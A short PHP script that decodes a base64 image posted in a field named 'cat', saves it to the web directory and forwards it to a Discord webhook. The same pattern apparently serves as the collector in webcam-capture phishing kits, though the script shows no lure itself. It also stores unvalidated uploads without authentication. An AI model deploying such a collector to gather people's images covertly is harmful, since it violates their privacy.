<?php

if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST['cat'])) {
    $date = date('YmdHis');
    $imageData = $_POST['cat'];
    $filteredData = substr($imageData, strpos($imageData, ",") + 1);
    $unencodedData = base64_decode($filteredData);
    $filename = __DIR__ . '/' . $date . '.png';
    file_put_contents($filename, $unencodedData);

    $discordWebhookUrl = '';

    $boundary = uniqid();
    $delimiter = '-------------' . $boundary;

    $postData = build_multipart_data($filename, $delimiter);

    $headers = [
        "Content-Type: multipart/form-data; boundary=" . $delimiter,
        "Content-Length: " . strlen($postData),
    ];

    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $discordWebhookUrl,
        CURLOPT_POST => true,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_HTTPHEADER => $headers,
        CURLOPT_POSTFIELDS => $postData
    ]);

    $response = curl_exec($ch);
    curl_close($ch);

    header('Content-Type: application/json');
    echo json_encode(['status' => 'ok']);
    exit();
}

function build_multipart_data($filepath, $boundary) {
    $eol = "\r\n";
    $filename = basename($filepath);
    $filedata = file_get_contents($filepath);

    $data = "--$boundary$eol";
    $data .= "Content-Disposition: form-data; name=\"file\"; filename=\"$filename\"$eol";
    $data .= "Content-Type: image/png$eol$eol";
    $data .= $filedata . $eol;
    $data .= "--$boundary--$eol";

    return $data;
}
?>
